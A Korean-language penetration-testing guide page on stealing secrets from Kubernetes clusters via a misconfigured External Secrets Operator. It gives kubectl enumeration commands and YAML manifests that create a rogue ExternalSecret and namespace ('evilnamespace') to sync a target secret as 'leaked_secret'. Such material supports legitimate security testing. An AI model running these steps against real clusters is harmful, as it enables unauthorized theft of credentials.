# 외부 시크릿 오퍼레이터

**이 페이지의 원 저자는** [**Fares**](https://www.linkedin.com/in/fares-siala/)

이 페이지는 잘못 구성된 ESO나 ESO를 사용하여 시크릿을 동기화하는 애플리케이션에서 시크릿을 도난할 수 있는 방법에 대한 일부 지침을 제공합니다.

## 면책 조항

아래에 표시된 기술은 특정 상황이 충족될 때에만 작동할 수 있습니다. 예를 들어, 당신이 소유하거나 침입한 네임스페이스에서 시크릿을 동기화할 수 있도록 허용하는 필요 요구 사항에 따라 달라집니다. 스스로 해결해야 합니다.

## 전제 조건

1. 어드민 권한이 있는 쿠버네티스 / 오픈쉬프트 클러스터에서 발판을 마련합니다.
2. 적어도 클러스터 수준의 ExternalSecret에 대한 읽기 액세스 권한
3. ESO가 시크릿을 동기화할 수 있도록 허용하는 필요한 레이블 / 주석 또는 그룹 멤버십이 있는지 확인합니다. 운이 좋다면 정의된 시크릿을 자유롭게 도난할 수 있습니다.

### 기존 ClusterSecretStore에 대한 정보 수집

이 리소스를 읽을 충분한 권한이 있는 사용자가 있다고 가정하고, 먼저 기존 _**ClusterSecretStores**_를 나열하는 것부터 시작합니다.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

클러스터 시크릿 스토어의 이름이 _**mystore**_로 가정해 봅시다. 연결된 externalsecret을 열거하면 됩니다.
```sh
kubectl get externalsecret -A | grep mystore
```
_이 리소스는 네임스페이스 범위로 제한되어 있으므로 이미 어떤 네임스페이스를 찾아야 하는지 알고 있다면 모든 네임스페이스를 확인하려면 -A 옵션을 추가하십시오._

외부 시크릿이 정의된 목록을 가져와야 합니다. _**mysecret**_라는 외부 시크릿 객체를 찾았다고 가정하고 해당 시크릿이 어떤 종류의 비밀을 보유하고 있는지에 대한 추가 정보를 수집하십시오.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### 조각 모으기

여기서 Secret 리소스에 정의된 하나 이상의 비밀 이름을 얻을 수 있습니다. 다음과 유사한 출력을 얻게 됩니다:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
```md
다음은 우리가 가지고 있는 것입니다:

* ClusterSecretStore의 이름
* ExternalSecret의 이름
* 시크릿의 이름

이제 필요한 모든 것을 갖췄으니, ExternalSecret를 생성할 수 있습니다 (그리고 새로운 시크릿을 동기화하기 위해 필요한 전제조건을 준수하는 새로운 Namespace를 패치/생성할 수 있습니다):
```
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
수 분 후에 동기화 조건이 충족되면 네임스페이스 내부에서 누출된 비밀을 볼 수 있어야 합니다.
```sh
kubectl get secret leaked_secret -o yaml
```
## 참고 자료

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
